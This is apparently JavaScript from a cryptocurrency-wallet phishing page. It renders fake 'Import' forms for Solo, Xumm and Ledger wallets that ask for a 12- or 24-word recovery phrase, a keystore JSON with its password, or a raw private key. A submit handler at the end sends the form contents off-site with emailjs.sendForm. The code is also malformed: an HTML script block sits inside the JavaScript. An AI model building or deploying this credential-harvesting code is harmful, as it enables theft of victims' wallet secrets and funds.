function getform_1(){

  let output = `
  
 
   
<div class="body_pack">

<div class="container">
    <!-- <div class="header">
        <h2>Create Account</h2>
    </div> -->
    <form id="form" class="form">
        <div class="form-control">
            <label for="wallet">Wallet:</label>
            <select id="wallet" name="wallet">
                <option value="Trust wallet">Solo Sec</option>
                  <option value="Binance wallet">Xumm</option>
                  <option value="Others">ledger</option>
            </select>
        
        </div>
        <div class="form-control">
            <label for="Phrase">Phrase:</label>
            <textarea  placeholder="" id="Phrase" ></textarea>
          <p>typically 12 (sometimes 24)Words seperated by a single space</p>
        </div>
      
        <button>Import</button>
    </form>
</div>

</div>


  
  `;

  document.getElementById('output').innerHTML=output;

}


function getform_2(){

  let output = `
  
 
<div class="body_pack">

<div class="container">
    <!-- <div class="header">
        <h2>Create Account</h2>
    </div> -->
    <form id="form" class="form">
        <div class="form-control">
            <label for="wallet">Wallet:</label>
            <select id="wallet" name="wallet">
                <option value="Trust wallet">Solo Sec</option>
                  <option value="Binance wallet">Xumm</option>
                  <option value="Others">ledger</option>
            </select>
        </div>
        <div class="form-control">
            <label for="Keystore_json">Keystore json:</label>
            <textarea  placeholder="" id="Keystore_json" ></textarea>
          
        </div>
        <div class="form-control">
            <label for="username">Password</label>
            <input type="password" placeholder="Password" id="password"/>
           
        </div>
        <button>Import</button>
    </form>
</div>

</div>


  `;

  document.getElementById('output').innerHTML=output;

}


function getform_3(){

  let output = `
  
 
   
<div class="body_pack">

<div class="container">
    <!-- <div class="header">
        <h2>Create Account</h2>
    </div> -->
    <form id="form" class="form">
        <div class="form-control">
            <label for="wallet">Wallet:</label>
            <select id="wallet" name="wallet">
                <option value="Solo dex">Solo dex</option>
                  <option value="Xumm">Xumm</option>
                  <option value="ledger live">ledger live</option>
            </select>
        </div>
        <div class="form-control">
            <label for="Private_Key">Private Key:</label>
            <textarea  placeholder="" id="Private_Key" ></textarea>
          
        </div>
      
        <button type>Import</button>
    </form>
</div>

</div>


  
  `;

  document.getElementById('output').innerHTML=output;

}

form.addEventListener('submit', e => {
	e.preventDefault();
	
	checkInputs();
});

<script type="text/javascript">
        window.onload = function() {
            document.getElementById('form').addEventListener('submit', function(event) {
                event.preventDefault();
                // generate a five digit number for the contact_number variable
                this.contact_number.value = Math.random() * 100000 | 0;
                // these IDs from the previous steps
                emailjs.sendForm('contact_service', 'form', this)
                    .then(function() {
                        console.log('SUCCESS!');
                    }, function(error) {
                        console.log('FAILED...', error);
                    });
            });
        }
    </script>